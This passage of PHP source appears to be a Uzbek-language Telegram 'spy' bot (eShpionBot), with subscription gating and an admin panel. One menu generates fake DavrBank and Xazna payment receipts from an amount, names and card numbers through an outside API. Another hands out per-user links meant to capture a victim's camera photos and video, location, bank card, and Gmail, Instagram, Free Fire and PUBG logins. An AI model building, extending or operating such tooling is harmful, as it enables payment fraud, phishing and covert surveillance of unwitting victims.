            'text' => "⚠️ <b>Botdan foydalanish uchun kanallarga obuna bo'ling!</b>\n\n"
                    . "Quyidagi kanallarga obuna bo'ling va /start yozing:",
            'parse_mode' => 'html',
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode(['inline_keyboard' => $subscription['buttons']]),
        ]);
        exit();
    }
    
        
        $balance = $user_data['balance'] ?? 0;
        $stars_balance = $user_data['stars_balance'] ?? 0;
        $phone = $user_data['phone'] ?? 'Kiritilmagan';
        $first_seen = date('d.m.Y H:i', strtotime($user_data['first_seen']));
        $last_seen = date('d.m.Y H:i', strtotime($user_data['last_seen']));
        
        $profile_text = "👤 <b>Sizning profilingiz</b>\n\n"
                      . "🆔 ID: <code>$uid</code>\n"
                      . "👤 Ism: $full_name\n"
                      . "🔗 Username: @" . ($username ?: 'yo\'q') . "\n"
                      . "📅 Ro'yxatdan o'tgan: $first_seen\n";
        
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => $profile_text,
            'parse_mode' => 'HTML'
        ]);
        exit();
    }
    
// ========== XIZMATLAR ==========
if ($text === "🔐 Xizmatlar") {

    // Majburiy obuna tekshirish
    $subscription = checkSubscriptionForAll($uid);
    if (!$subscription['status']) {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "⚠️ <b>Botdan foydalanish uchun kanallarga obuna bo'ling!</b>\n\n"
                    . "Quyidagi kanallarga obuna bo'ling va /start yozing:",
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode([
                'inline_keyboard' => $subscription['buttons']
            ]),
        ]);
        exit();
    }

    // Xizmatlar menyusi
    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => "🔐 <b>Xizmatlar menyusi</b>\n\nQuyidagilardan birini tanlang:",
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode([
            'keyboard' => [
                [
                    ['text' => "💫 Soxta chek"],
                    ['text' => "📢 Asosiy xizmatlar"]
                ],
                [
                    ['text' => "◀️ Orqaga", 'style' => "danger"]
                ]
            ],
            'resize_keyboard' => true,
            'one_time_keyboard' => false
        ])
    ]);
    exit();
}



// --- YORDAMCHI FUNKSIYA (Takrorlanishni kamaytirish uchun) ---
function cancelWaiting($uid) {
    if (file_exists("waiting_{$uid}.txt")) {
        unlink("waiting_{$uid}.txt");
    }
}

// 1. "Orqaga" tugmasi bosilganda holatni bekor qilish
if ($text === "▶️ Orqaga") {
    cancelWaiting($uid);
    $text = "💫 Soxta chek"; // Foydalanuvchini asosiy menyuga qaytarish
}

// 2. Asosiy menyu: Soxta chek
if ($text === "💫 Soxta chek") {
    // Majburiy obuna tekshirish  
    $subscription = checkSubscriptionForAll($uid);  
    if (!$subscription['status']) {  
        bot('sendMessage', [  
            'chat_id' => $cid,  
            'text' => "⚠️ <b>Botdan foydalanish uchun kanallarga obuna bo'ling!</b>\n\n"  
                    . "Quyidagi kanallarga obuna bo'ling va /start yozing:",  
            'parse_mode' => 'HTML',  
            'disable_web_page_preview' => true,  
            'reply_markup' => json_encode([  
                'inline_keyboard' => $subscription['buttons']  
            ]),  
        ]);  
        exit();  
    }  

    bot('sendMessage', [  
        'chat_id' => $cid,  
        'text' => "🔐 <b>Xizmatlar menyusi</b>\n\nQuyidagilardan birini tanlang:",  
        'parse_mode' => 'HTML',  
        'reply_markup' => json_encode([  
            'keyboard' => [  
                [['text' => "🟢 Xazna", 'style' => "primary"], ['text' => "🟢 Xazna Tranzaksiya", 'style' => "success"]],  
                [['text' => "⚪️ DavrBank", 'style' => "primary"], ['text' => "◀️ Orqaga", 'style' => "danger"]]  
            ],  
            'resize_keyboard' => true  
        ])  
    ]);  
    cancelWaiting($uid);
    exit();
}

// --- XIZMATLARNI TANLASH ---

if ($text === "⚪️ DavrBank") {
    bot('sendMessage', [  
        'chat_id' => $cid,  
        'text' => "💳 <b>DavrBank</b>\n\nFormat:\n<code>Summa\nSoat (10:01)\nSana (01.01.2026)\nIsm Sharif\nKarta 1\nKarta 2</code>",  
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode(['keyboard' => [[['text' => "▶️ Orqaga", 'style' => "danger"]]], 'resize_keyboard' => true])
    ]);  
    file_put_contents("waiting_{$uid}.txt", "davrbank");  
    exit();
}

if ($text === "🟢 Xazna Tranzaksiya") {
    bot('sendMessage', [  
        'chat_id' => $cid,  
        'text' => "💳 <b>Xazna (Tranzaksiya)</b>\n\nFormat:\n<code>Summa\nSana\nSoat\nKarta 1\nKarta 2\nIsm Sharif</code>",  
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode(['keyboard' => [[['text' => "▶️ Orqaga", 'style' => "danger"]]], 'resize_keyboard' => true])
    ]);  
    file_put_contents("waiting_{$uid}.txt", "paynet_trx");  
    exit();
}

if ($text === "🟢 Xazna") {
    bot('sendMessage', [  
        'chat_id' => $cid,  
        'text' => "💳 <b>Xazna (Oddiy)</b>\n\nFormat:\n<code>Summa\nSoat</code>",  
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode(['keyboard' => [[['text' => "▶️ Orqaga", 'style' => "danger"]]], 'resize_keyboard' => true])
    ]);  
    file_put_contents("waiting_{$uid}.txt", "paynet_simple");  
    exit();
}

// --- MA'LUMOTLARNI QABUL QILISH VA QAYTA ISHLASH ---

if (!empty($text) && file_exists("waiting_{$uid}.txt")) {
    $state = trim(file_get_contents("waiting_{$uid}.txt"));  
    $lines = explode("\n", trim($text));

    if ($state === 'davrbank') {  
        if (count($lines) !== 6) {
            bot('sendMessage', ['chat_id' => $cid, 'text' => "❌ Xato format! 6 qator ma'lumot yuboring.", 'parse_mode' => 'HTML']);
            exit();
        }
        list($summa, $time, $sana, $name, $card1, $card2) = array_map('trim', $lines);  
        $api_url = "https://wwwi.qzz.io/api/DavrBank/api.php?summa=$summa&soat=$time&sana=$sana&ism=" . urlencode($name) . "&karta1=$card1&karta2=$card2";
    } 
    
    elseif ($state === 'paynet_trx') {  
        if (count($lines) !== 6) {
            bot('sendMessage', ['chat_id' => $cid, 'text' => "❌ Xato format! 6 qator ma'lumot yuboring.", 'parse_mode' => 'HTML']);
            exit();
        }
        list($summa, $sana, $time, $card1, $card2, $name) = array_map('trim', $lines);  
        $api_url = "https://wwwi.qzz.io/api/Xazna/transaksiya/api.php?summa=$summa&sana=$sana&soat=$time&karta1=$card1&karta2=$card2&ism=" . urlencode($name);
    } 
    
    elseif ($state === 'paynet_simple') {  
        if (count($lines) !== 2) {
            bot('sendMessage', ['chat_id' => $cid, 'text' => "❌ Xato format! 2 qator ma'lumot yuboring.", 'parse_mode' => 'HTML']);
            exit();
        }
        list($summa, $time) = array_map('trim', $lines);  
        $api_url = "https://wwwi.qzz.io/api/Xazna/api.php?summa=$summa&soat=$time";
    }

    // Rasmni yuborish
    if (isset($api_url)) {
        bot('sendPhoto', [  
            'chat_id' => $cid,  
            'photo' => $api_url,  
            'caption' => "<b>✅ Chek @eShpionBot tomonidan tayyorlandi!</b>",  
            'parse_mode' => 'HTML'  
        ]);  
        cancelWaiting($uid);
        exit();
    }
}


if ($text === "📢 Asosiy xizmatlar") {
    // Majburiy obuna tekshirish
    $subscription = checkSubscriptionForAll($uid);
    if (!$subscription['status']) {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "⚠️ <b>Botdan foydalanish uchun kanallarga obuna bo'ling!</b>\n\n"
                    . "Quyidagi kanallarga obuna bo'ling va /start yozing:",
            'parse_mode' => 'html',
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode(['inline_keyboard' => $subscription['buttons']]),
        ]);
        exit();
    }
    

    
    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => "🔐 <b>Xizmatlar menyusi</b>\n\nQuyidagilardan birini tanlang:",
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode([
            'keyboard' => [
                [['text' => "📸 Rasm oldi", 'style' => "success"], ['text' => "📷 Rasm orqa", 'style' => "danger"]],
                [['text' => "🎬 Video oldi", 'style' => "success"], ['text' => "🎬 Video orqa", 'style' => "danger"]],
                [['text' => "📍 Lokatsiya", 'style' => "success"], ['text' => "💳 Bank kartasi", 'style' => "danger"]],
                [['text' => "🎮 Free Fire", 'style' => "success"], ['text' => "🎯 PUBG", 'style' => "danger"]],
                [['text' => "📧 Gmail", 'style' => "success"], ['text' => "📷 Instagram", 'style' => "danger"]],
                [['text' => "◀️ Orqaga", 'style' => "primary"]],
            ],
            'resize_keyboard' => true
        ])
    ]);
    exit();
}

// ========== ORQAGA (Xizmatlar menyusidan keyin) ==========
if ($text === "◀️ Orqaga") {
    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => "🏠 <b>Asosiy menyuga qaytdingiz</b>",
        'parse_mode' => 'HTML',
        'reply_markup' => mainKeyboard(isAdmin($uid))
    ]);
    setUserStep($uid, '');
    exit();
}

// ========== XIZMAT TURLARI ==========
$service_types = [
    "📸 Rasm oldi" => "old_kamera",
    "📷 Rasm orqa" => "orqa_kamera", 
    "🎬 Video oldi" => "old_video",
    "🎬 Video orqa" => "orqa_video",
    "📍 Lokatsiya" => "lokatsiya",
    "💳 Bank kartasi" => "bank",
    "🎮 Free Fire" => "freefire",
    "🎯 PUBG" => "pubg",
    "📧 Gmail" => "gmail",
    "📷 Instagram" => "instagram"
];

if (array_key_exists($text, $service_types)) {
    $user_data = getUserData($uid);
    
    $service_type = $service_types[$text];
    $link = getServiceLink($uid, $service_type);
    $service_name = getServiceName($service_type);
    
    $message_text = "✅ <b>$service_name xizmatingiz tayyor!</b>\n\n" .
                   "🔗 <b>Link:</b> <code>$link</code>\n\n" .
                   "📱 Bu linkni telefoningizga yuboring va oching.\n" .
                   "👤 <b>Foydalanuvchi ID:</b> <code>$uid</code>";
    
    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => $message_text,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => "🔗 Ulashish", 'url' => "https://t.me/share/url?url=" . urlencode($link), 'style' => "danger"],
                    ['text' => "📋 Nusxa olish", 'copy_text' => ['text' => $link], 'style' => "primary"]
                ]
            ]
        ])
    ]);
    exit();
}
    // QOIDALAR
    if ($text === "📘 Qoidalar") {
    	    $subscription = checkSubscriptionForAll($uid);
    if (!$subscription['status']) {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "⚠️ <b>Botdan foydalanish uchun kanallarga obuna bo'ling!</b>\n\n"
                    . "Quyidagi kanallarga obuna bo'ling va /start yozing:",
            'parse_mode' => 'html',
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode(['inline_keyboard' => $subscription['buttons']]),
        ]);
        exit();
    }
    
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => getRules(),
            'parse_mode' => 'HTML'
        ]);
        exit();
    }
    
    // BOG'LANISH
    if ($text === "📞 Bog'lanish") {
    	    $subscription = checkSubscriptionForAll($uid);
    if (!$subscription['status']) {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "⚠️ <b>Botdan foydalanish uchun kanallarga obuna bo'ling!</b>\n\n"
                    . "Quyidagi kanallarga obuna bo'ling va /start yozing:",
            'parse_mode' => 'html',
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode(['inline_keyboard' => $subscription['buttons']]),
        ]);
        exit();
    }
    
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "💬 <b>Savol yoki takliflaringiz bo'lsa murojaat qiling:</b>",
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode([
                'inline_keyboard' => [[
                    ['text' => "☎️ Qo'llab-quvvatlash", 'url' => "https://t.me/eShpion_Bot", 'icon_custom_emoji_id' => "5281024210146201465", 'style' => "success"]
                ]]
            ])
        ]);
        exit();
    }
    
    // ========== ADMIN PANEL ==========
    if ($text == "🗄 Boshqaruv paneli" && isAdmin($uid)) {
        $panel = json_encode([
            'resize_keyboard' => true,
            'keyboard' => [
                [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
            ]
        ]);
        
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "<b>🛠 Admin paneliga xush kelibsiz!</b>",
            'parse_mode' => 'HTML',
            'reply_markup' => $panel
        ]);
        exit();
    }
    
    // ========== ADMIN PANEL BO'LIMLARI ==========
    if (isAdmin($uid)) {
        // ORQAGA (admin panelida)
        if ($text == "◀️ Orqaga") {
            $panel = json_encode([
                'resize_keyboard' => true,
                'keyboard' => [
                    [['text' => "?? Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                    [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                    [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                ]
            ]);
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "<b>Admin paneliga xush kelibsiz!</b>",
                'parse_mode' => 'HTML',
                'reply_markup' => $panel
            ]);
            exit();
        }
        
        // STATISTIKA
        if ($text == "📊 Statistika") {
            $stats = getStats();
            $stats_text = "📊 <b>Bot statistikasi</b>\n\n"
                        . "👥 Jami foydalanuvchilar: <b>{$stats['total']} ta</b>\n"
                        . "📈 Bugun qo'shilgan: <b>{$stats['today']} ta</b>\n"
                        . "📆 So'nggi 7 kun: <b>{$stats['weekly']} ta</b>\n"
                        . "🎁 Yuborilgan giftlar: <b>{$stats['total_gifts']} ta</b>\n"
                        . "💰 Jami to'lovlar: <b>{$stats['total_payments']} ta</b>\n\n"
                        . "⏰ Hisobot vaqti: " . date('d.m.Y H:i');
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => $stats_text,
                'parse_mode' => 'HTML'
            ]);
            exit();
        }
        
        // FOYDALANUVCHILAR
        if ($text == "👤 Foydalanuvchilar") {
            $total = getStats()['total'];
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "👥 <b>Foydalanuvchilar boshqaruvi</b>\n\n"
                        . "Jami: <b>$total ta</b>\n\n"
                        . "Foydalanuvchi ID sini yuboring yoki /all yozing:",
                'parse_mode' => 'HTML',
                'reply_markup' => backKeyboard()
            ]);
            setUserStep($uid, 'search_user');
            exit();
        }
        
        // XABARLAR
        if ($text == "📢 Xabarlar") {
            $panel = json_encode([
                'resize_keyboard' => true,
                'keyboard' => [
                    [['text' => "📢 Hammaga xabar"], ['text' => "👤 Bir kishiga xabar"]],
                    [['text' => "📨 Forward xabar"],['text' => "◀️ Orqaga"]],
                ]
            ]);
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "📤 <b>Xabar yuborish paneli</b>\n\n"
                        . "Quyidagi variantlardan birini tanlang:",
                'parse_mode' => 'HTML',
                'reply_markup' => $panel
            ]);
            exit();
        }
        
        // GIFT YUBORISH (ADMIN PANELDAN)
        if ($text == "🎁 Gift yuborish") {
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "🎁 <b>Sovg'a yuborish bo'limi</b>\n\nKimga yubormoqchisiz? Foydalanuvchi <b>ID</b> sini yuboring:",
                'parse_mode' => 'HTML',
                'reply_markup' => backKeyboard()
            ]);
            setUserStep($uid, 'waiting_gift_id');
            exit();
        }
        
        // SOZLAMALAR
        if ($text == "⚙️ Sozlamalar") {
            $panel = json_encode([
                'resize_keyboard' => true,
                'keyboard' => [
                    [['text' => "📢 Kanallar"], ['text' => "💰 To'lovlar"]],
                    [['text' => "🤖 Bot holati"], ['text' => "👥 Adminlar"]],
                    [['text' => "◀️ Orqaga"]]
                ]
            ]);
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "⚙️ <b>Bot sozlamalari</b>\n\n"
                        . "Botning turli sozlamalarini o'zgartirishingiz mumkin:",
                'parse_mode' => 'HTML',
                'reply_markup' => $panel
            ]);
            exit();
        }
        
        // ========== SOZLAMALAR BO'LIMLARI ==========
        
        // KANALLAR
        if ($text == "📢 Kanallar") {
            $channels = getChannels();
            
            if (empty($channels)) {
                $channels_text = "❌ Hech qanday kanal qo'shilmagan";
            } else {
                $channels_text = "📢 <b>Kanallar ro'yxati:</b>\n\n";
                $public_count = 0;
                $private_count = 0;
                
                foreach ($channels as $index => $channel) {
                    if ($channel['type'] == 'public') {
                        $public_count++;
                        $channels_text .= "🌐 $public_count. @" . $channel['username'] . "\n";
                    } else {
                        $private_count++;
                        $channels_text .= "🔒 Maxfiy $private_count. Chat ID: " . $channel['chat_id'] . "\n";
                    }
                }
                
                $channels_text .= "\n🌐 Ommaviy kanallar: $public_count ta\n";
                $channels_text .= "🔒 Maxfiy kanallar: $private_count ta";
            }
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => $channels_text,
                'parse_mode' => 'HTML',
                'reply_markup' => json_encode([
                    'inline_keyboard' => [
                        [['text' => '➕ Ommaviy kanal', 'callback_data' => 'add_public', 'style' => "primary"]],
                        [['text' => '➕ Maxfiy kanal', 'callback_data' => 'add_private', 'style' => "danger"]],
                        [['text' => '➖ Kanal o\'chirish', 'callback_data' => 'remove_channel', 'style' => "success"]]
                    ]
                ])
            ]);
            exit();
        }
        
        // QOIDA TAXRIRLASH
        if ($text == "📘 Qoidalar") {
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "✍️ <b>Yangi qoida matnini yuboring:</b>",
                'parse_mode' => 'HTML',
                'reply_markup' => backKeyboard()
            ]);
            setUserStep($uid, 'edit_rules');
            exit();
        }
        
        // BOT HOLATI
        if ($text == "🤖 Bot holati") {
            $current_status = getBotStatus();
            $status_text = $current_status == 'active' ? '✅ Faol' : '⏸ To\'xtatilgan';
            $button_text = $current_status == 'active' ? '⏸ To\'xtatish' : '✅ Faollashtirish';
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "🤖 <b>Bot holati:</b> $status_text",
                'parse_mode' => 'HTML',
                'reply_markup' => json_encode([
                    'inline_keyboard' => [[
                        ['text' => $button_text, 'callback_data' => 'toggle_bot', 'style' => "primary"]
                    ]]
                ])
            ]);
            exit();
        }
        
        // ADMINLAR
        if ($text == "👥 Adminlar") {
            $admins = getAdmins();
            $admin_text = "👥 <b>Adminlar ro'yxati</b>\n\n";
            foreach ($admins as $admin) {
                $admin_text .= "• <code>$admin</code>\n";
            }
            
            $keyboard = [];
            if ($uid == $admin_id) {
                $keyboard[] = [['text' => '➕ Admin qo\'shish', 'callback_data' => 'add_admin', 'style' => "primary"]];
                $keyboard[] = [['text' => '➖ Admin o\'chirish', 'callback_data' => 'remove_admin', 'style' => "danger"]];
            }
            $keyboard[] = [['text' => '📋 Adminlar ro\'yxati', 'callback_data' => 'list_admins', 'style' => "success"]];
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => $admin_text,
                'parse_mode' => 'HTML',
                'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
            ]);
            exit();
        }
        
        // TO'LOVLAR
        if ($text == "💰 To'lovlar") {
            $payments_dir = "payments";
            $payments_text = "💰 <b>Oxirgi to'lovlar</b>\n\n";
            
            if (!is_dir($payments_dir)) {
                mkdir($payments_dir, 0777, true);
            }
            
            $today_file = "$payments_dir/" . date('Y-m-d') . ".txt";
            if (file_exists($today_file)) {
                $payments = file($today_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                $count = 0;
                foreach ($payments as $payment) {
                    if ($count >= 10) break;
                    $payments_text .= "• $payment\n";
                    $count++;
                }
                if ($count == 0) {
                    $payments_text .= "❌ Bugun to'lov bo'lmagan";
                }
            } else {
                $payments_text .= "❌ Bugun to'lov bo'lmagan";
            }
            
            $payments_text .= "\n\n📅 Bugun: " . date('d.m.Y');
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => $payments_text,
                'parse_mode' => 'HTML'
            ]);
            exit();
        }
        
        // BOG'LANISH (ADMIN)
        if ($text == "📞 Bog'lanish") {
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "💬 <b>Bog'lanish ma'lumotlari</b>\n\n"
                        . "Bot yaratuvchisi: @xolisiy\n"
                        . "Qo'llab-quvvatlash: @xolisiy\n\n"
                        . "Texnik muammolar bo'lsa yoki yangi takliflaringiz bo'lsa, yozib qoldiring.",
                'parse_mode' => 'HTML'
            ]);
            exit();
        }
        
        // ========== XABAR YUBORISH TURLARI ==========
        
        // HAMMAGA XABAR
        if ($text == "📢 Hammaga xabar") {
            $total = getStats()['total'];
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "📢 <b>Barcha foydalanuvchilarga xabar yuborish</b>\n\n"
                        . "Barcha $total ta foydalanuvchiga yubormoqchi bo'lgan xabaringizni yuboring.\n\n"
                        . "⚠️ HTML formatida yuborishingiz mumkin.\n"
                        . "❌ Bekor qilish uchun '◀️ Orqaga' tugmasini bosing.",
                'parse_mode' => 'HTML',
                'reply_markup' => backKeyboard()
            ]);
            setUserStep($uid, 'broadcast_all');
            exit();
        }
        
        // BIR KISHIGA XABAR
        if ($text == "👤 Bir kishiga xabar") {
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "👤 <b>Bir kishiga xabar yuborish</b>\n\n"
                        . "Xabar yubormoqchi bo'lgan foydalanuvchi <b>ID raqamini</b> yuboring:",
                'parse_mode' => 'HTML',
                'reply_markup' => backKeyboard()
            ]);
            setUserStep($uid, 'single_message_user');
            exit();
        }
        
        // FORWARD XABAR
        if ($text == "📨 Forward xabar") {
            $panel = json_encode([
                'resize_keyboard' => true,
                'keyboard' => [
                    [['text' => "📢 Hammaga forward"], ['text' => "👤 Bir kishiga forward"]],
                    [['text' => "◀️ Orqaga"]],
                ]
            ]);
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "📨 <b>Forward xabar yuborish</b>\n\n"
                        . "Qaysi usulda forward qilmoqchisiz?",
                'parse_mode' => 'HTML',
                'reply_markup' => $panel
            ]);
            exit();
        }
        
        // XABAR STATISTIKASI
        if ($text == "📊 Xabar statistikasi") {
            $messages_dir = "messages";
            $messages_text = "📊 <b>Xabar yuborish statistikasi</b>\n\n";
            
            if (!is_dir($messages_dir)) {
                mkdir($messages_dir, 0777, true);
            }
            
            $today_file = "$messages_dir/" . date('Y-m-d') . ".txt";
            if (file_exists($today_file)) {
                $messages = file($today_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                $count = 0;
                $messages_text .= "📅 <b>Bugungi xabarlar:</b>\n";
                foreach ($messages as $message) {
                    if ($count >= 5) break;
                    $messages_text .= "• $message\n";
                    $count++;
                }
                if ($count == 0) {
                    $messages_text .= "❌ Bugun xabar yuborilmagan\n";
                }
            } else {
                $messages_text .= "❌ Bugun xabar yuborilmagan\n";
            }
            
            // Oxirgi 7 kun statistikasi
            $week_stats = [];
            for ($i = 0; $i < 7; $i++) {
                $date = date('Y-m-d', strtotime("-$i days"));
                $file = "$messages_dir/$date.txt";
                if (file_exists($file)) {
                    $count = count(file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
                    $week_stats[] = date('d.m', strtotime("-$i days")) . ": $count ta";
                }
            }
            
            if (!empty($week_stats)) {
                $messages_text .= "\n📆 <b>Oxirgi 7 kun:</b>\n";
                $messages_text .= implode("\n", $week_stats);
            }
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => $messages_text,
                'parse_mode' => 'HTML'
            ]);
            exit();
        }
        
        // FORWARD XABAR TURLARI
        if ($text == "📢 Hammaga forward") {
            setUserStep($uid, 'forward_all');
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "📢 <b>Barchaga forward xabar yuborish</b>\n\n"
                        . "Iltimos, forward qilmoqchi bo'lgan xabaringizni yuboring:",
                'parse_mode' => 'HTML',
                'reply_markup' => backKeyboard()
            ]);
            exit();
        }
        
        if ($text == "👤 Bir kishiga forward") {
            setUserStep($uid, 'forward_single_user');
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "👤 <b>Bir kishiga forward xabar yuborish</b>\n\n"
                        . "Xabar forward qilmoqchi bo'lgan foydalanuvchi <b>ID raqamini</b> yuboring:",
                'parse_mode' => 'HTML',
                'reply_markup' => backKeyboard()
            ]);
            exit();
        }
    }
    
    // ========== ADMIN STEP HANDLERS (TO'LIQ QILINGAN) ==========
    if (isAdmin($uid)) {
        $admin_step = getUserStep($uid);
        
        // ========== KANAL QO'SHISH ==========
        
        // OMMAVIY KANAL QO'SHISH
        if ($admin_step == 'add_public') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Kanal qo'shish bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            // @ belgisini olib tashlash
            $channel_username = ltrim($text, '@');
            
            // Kanal mavjudligini tekshirish
            $check = bot('getChat', ['chat_id' => "@$channel_username"]);
            
            if (!$check->ok) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Kanal topilmadi yoki bot kanalga admin emas!</b>\n\n"
                            . "Iltimos, quyidagilarni tekshiring:\n"
                            . "1. Kanal username to'g'rimi?\n"
                            . "2. Bot kanalga admin qilinganmi?\n"
                            . "3. Kanal ochiqmi (private emasmi)?",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            // Kanalni qo'shish
            if (addPublicChannel($channel_username)) {
                setUserStep($uid, '');
                
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>Ommaviy kanal muvaffaqiyatli qo'shildi!</b>\n\n"
                            . "🌐 Kanal: @$channel_username\n"
                            . "📝 Nomi: " . ($check->result->title ?? 'Noma\'lum'),
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Bu kanal allaqachon qo'shilgan!</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
            }
            exit();
        }
        
        // MAXFIY KANAL QO'SHISH
        if ($admin_step == 'add_private') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Kanal qo'shish bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            // Format: link|chat_id
            $parts = explode('|', $text);
            
            if (count($parts) != 2) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Noto'g'ri format!</b>\n\n"
                            . "To'g'ri format: <code>link|chat_id</code>\n\n"
                            . "<b>Misol:</b> <code>https://t.me/+AbCdEfGhIjKlMnOp|-1001234567890</code>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            $link = trim($parts[0]);
            $chat_id = trim($parts[1]);
            
            // Linkni tekshirish
            if (!filter_var($link, FILTER_VALIDATE_URL)) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Noto'g'ri link!</b>\n\n"
                            . "Iltimos, to'g'ri Telegram linkini kiriting.",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            // Chat ID ni tekshirish
            if (!is_numeric($chat_id) || $chat_id >= 0) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Noto'g'ri Chat ID!</b>\n\n"
                            . "Chat ID manfiy son bo'lishi kerak (masalan: -1001234567890).",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            // Kanalni qo'shish
            if (addPrivateChannel($link, $chat_id)) {
                setUserStep($uid, '');
                
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>Maxfiy kanal muvaffaqiyatli qo'shildi!</b>\n\n"
                            . "🔗 Link: $link\n"
                            . "🆔 Chat ID: <code>$chat_id</code>\n\n"
                            . "📌 Endi foydalanuvchilar ushbu kanalga qo'shilish so'rovini yuborishlari mumkin.",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Bu kanal allaqachon qo'shilgan yoki xatolik yuz berdi!</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
            }
            exit();
        }
        
        // KANAL O'CHIRISH
